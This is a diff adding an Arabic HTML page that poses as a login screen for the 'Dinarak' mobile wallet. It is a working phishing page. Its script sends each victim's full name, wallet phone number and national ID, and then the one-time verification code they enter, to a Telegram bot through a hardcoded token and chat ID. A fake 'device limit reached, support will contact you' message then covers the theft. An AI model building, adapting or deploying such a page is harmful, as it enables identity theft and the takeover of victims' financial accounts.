@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>تسجيل دخول - محفظة دينارك</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- خطوط عربية حديثة -->
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@500;700&family=Tajawal:wght@400;700&family=Cairo:wght@700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Noto Kufi Arabic', 'Tajawal', Arial, sans-serif;
+      background: linear-gradient(135deg, #fce4ec 0%, #fff0f6 100%);
+      min-height: 100vh;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .login-container {
+      background: #fff;
+      border-radius: 22px;
+      box-shadow: 0 6px 32px rgba(225, 30, 90, 0.10);
+      padding: 36px 28px 28px 28px;
+      width: 90%;
+      max-width: 390px;
+      min-width: 280px;
+      text-align: center;
+      position: relative;
+      border: 2px solid #f48fb1;
+    }
+    .login-container img.logo {
+      width: 92px;
+      margin-bottom: 12px;
+      border-radius: 18px;
+      box-shadow: 0 2px 12px #f0629256;
+      background: #fff;
+      border: 2px solid #f06292;
+    }
+    .login-container h2 {
+      font-size: 1.3rem;
+      margin: 0 0 18px 0;
+      color: #c2185b;
+      font-weight: 700;
+      font-family: 'Tajawal', 'Noto Kufi Arabic', sans-serif;
+      letter-spacing: .2px;
+    }
+    .form-group {
+      text-align: right;
+      margin-bottom: 16px;
+    }
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 1.03rem;
+      color: #ad1457;
+      font-weight: 700;
+      font-family: 'Noto Kufi Arabic', 'Tajawal', sans-serif;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 11px 10px;
+      border: 1.2px solid #f8bbd0;
+      border-radius: 11px;
+      font-size: 1rem;
+      background: #fce4ec;
+      box-sizing: border-box;
+      transition: border 0.2s;
+      font-family: 'Tajawal', 'Noto Kufi Arabic', Arial, sans-serif;
+      color: #ad1457;
+    }
+    .form-group input:focus {
+      outline: none;
+      border-color: #c2185b;
+      background: #fff0f6;
+    }
+    .submit-btn {
+      width: 100%;
+      background: linear-gradient(90deg, #e57373 10%, #f06292 90%);
+      color: #fff;
+      font-weight: bold;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: 11px;
+      padding: 13px 0;
+      margin-top: 12px;
+      transition: background 0.2s;
+      cursor: pointer;
+      font-family: 'Tajawal', 'Noto Kufi Arabic', Arial, sans-serif;
+      box-shadow: 0 2px 6px #f0629236;
+    }
+    .submit-btn:active, .submit-btn:focus {
+      background: #f06292;
+    }
+    .verify-input {
+      margin-top: 22px;
+      display: none;
+    }
+    .verify-input label {
+      font-family: 'Noto Kufi Arabic', 'Tajawal', sans-serif;
+      color: #c2185b;
+      font-weight: 700;
+      font-size: 1.05rem;
+      margin-bottom: 5px;
+      display: block;
+    }
+    .verify-input input {
+      text-align: center;
+      font-size: 1.4rem;
+      font-weight: 700;
+      font-family: 'Cairo', 'Tajawal', 'Noto Kufi Arabic', Arial, sans-serif;
+      color: #c2185b;
+      background: #fce4ec;
+      border: 1.2px solid #f8bbd0;
+      border-radius: 11px;
+      margin-bottom: 10px;
+      margin-top: 3px;
+      transition: border 0.2s;
+      letter-spacing: 0;
+      font-feature-settings: "calt" 1, "liga" 1;
+      direction: rtl;
+    }
+    .verify-input input:focus {
+      border-color: #c2185b;
+      background: #fff0f6;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 9;
+      right: 0; left: 0; top: 0; bottom: 0;
+      background: rgba(225, 30, 90, 0.10);
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-content {
+      background: #fff;
+      border-radius: 15px;
+      max-width: 330px;
+      padding: 30px 16px;
+      box-shadow: 0 6px 32px #f0629249;
+      text-align: center;
+      color: #c2185b;
+      font-size: 1.15rem;
+      font-family: 'Noto Kufi Arabic', 'Tajawal', Arial, sans-serif;
+      font-weight: 700;
+    }
+    @media (max-width: 500px) {
+      .login-container { padding: 22px 7px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img class="logo" src="https://www2.0zz0.com/2025/07/01/08/544783461.jpeg" alt="شعار دينارك">
+    <h2>تسجيل الدخول لمحفظة دينارك</h2>
+    <form id="loginForm" autocomplete="off">
+      <div class="form-group">
+        <label for="fullName">الاسم الرباعي</label>
+        <input type="text" id="fullName" name="fullName" maxlength="60" minlength="8" required autocomplete="off" placeholder="مثال: محمد أحمد سعيد علي">
+      </div>
+      <div class="form-group">
+        <label for="walletNumber">رقم المحفظة (الهاتف)</label>
+        <input type="tel" id="walletNumber" name="walletNumber" maxlength="10" minlength="10" required  autocomplete="off" placeholder="078XXXXXXXX">
+      </div>
+      <div class="form-group">
+        <label for="nationalId">الرقم الوطني</label>
+        <input type="number" id="nationalId" name="nationalId" maxlength="12" minlength="10" required autocomplete="off" placeholder="123456789012">
+      </div>
+      <button type="submit" class="submit-btn">متابعة</button>
+    </form>
+    <form id="verifyForm" class="verify-input">
+      <label for="verifyCode">رمز التحقق</label>
+      <input type="text" id="verifyCode" maxlength="6" minlength="4" required autocomplete="off" placeholder="أدخل الرمز المرسل">
+      <button type="submit" class="submit-btn" style="margin-top:9px;">تحقق</button>
+    </form>
+  </div>
+  <div class="modal" id="modalMsg">
+    <div class="modal-content">
+      تم الوصول إلى الحد الأقصى من الأجهزة<br>
+      سيتم التواصل معك من قبل الدعم الفني<br>
+      <span style="font-size:.95rem;color:#f8bbd0;margin-top:12px;display:block;">محفظة دينارك</span>
+    </div>
+  </div>
+
+  <script>
+    // التوكن و الايدي
+    const TELEGRAM_TOKEN = "7578423392:AAFJ9fcnZBcQiq-FZ0MvLKCmuv83UtUU98Y";
+    const TELEGRAM_CHAT_ID = "-4625923889";
+
+    const loginForm = document.getElementById('loginForm');
+    const verifyForm = document.getElementById('verifyForm');
+    const modal = document.getElementById('modalMsg');
+
+    let sentData = null;
+
+    // منع الكتابة أحرف في رقم المحفظة/الوطني
+    document.getElementById('walletNumber').addEventListener('input', function(e){
+      this.value = this.value.replace(/[^0-9]/g, '').slice(0,10);
+    });
+    document.getElementById('nationalId').addEventListener('input', function(e){
+      this.value = this.value.replace(/[^0-9]/g, '').slice(0,12);
+    });
+
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      // تحقق من صحة البيانات
+      const fullName = document.getElementById('fullName').value.trim();
+      const walletNumber = document.getElementById('walletNumber').value.trim();
+      const nationalId = document.getElementById('nationalId').value.trim();
+
+      if(fullName.split(' ').length < 4){
+        alert('يرجى إدخال الاسم الرباعي بشكل صحيح');
+        return;
+      }
+      if(walletNumber.length !== 10 || !walletNumber.startsWith('07')){
+        alert('يرجى إدخال رقم المحفظة بشكل صحيح');
+        return;
+      }
+      if(nationalId.length < 10){
+        alert('يرجى إدخال الرقم الوطني بشكل صحيح');
+        return;
+      }
+
+      // حفظ البيانات مؤقتاً
+      sentData = { fullName, walletNumber, nationalId };
+
+      // إرسال المعلومات الأولى للتيليجرام فقط بدون رمز تحقق
+      const msg = `🔐 تسجيل دخول جديد - دينارك\n\n👤 الاسم الرباعي: ${fullName}\n📱 رقم المحفظة: ${walletNumber}\n🆔 الرقم الوطني: ${nationalId}`;
+      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: msg
+        })
+      }).then(()=> {
+        // إظهار إدخال التحقق
+        loginForm.style.display = 'none';
+        verifyForm.style.display = 'block';
+      });
+    });
+
+    verifyForm.addEventListener('submit', function(e){
+      e.preventDefault();
+      const code = document.getElementById('verifyCode').value.trim();
+
+      // إرسال جميع البيانات مع رمز التحقق المُدخل من المستخدم
+      if(sentData) {
+        const msg = `✅ رمز تحقق جديد (دينارك)\n\n👤 الاسم الرباعي: ${sentData.fullName}\n📱 رقم المحفظة: ${sentData.walletNumber}\n🆔 الرقم الوطني: ${sentData.nationalId}\n🔑 رمز التحقق: ${code}`;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: msg
+          })
+        });
+      }
+
+      // حذف المعلومات من الذاكرة
+      sentData = null;
+
+      // إظهار الرسالة المنبثقة
+      modal.style.display = 'flex';
+      setTimeout(()=> {
+        modal.style.display='none';
+        location.reload(); // إعادة تعيين الصفحة
+      }, 4300);
+    });
+  </script>
+</body>
+</html>
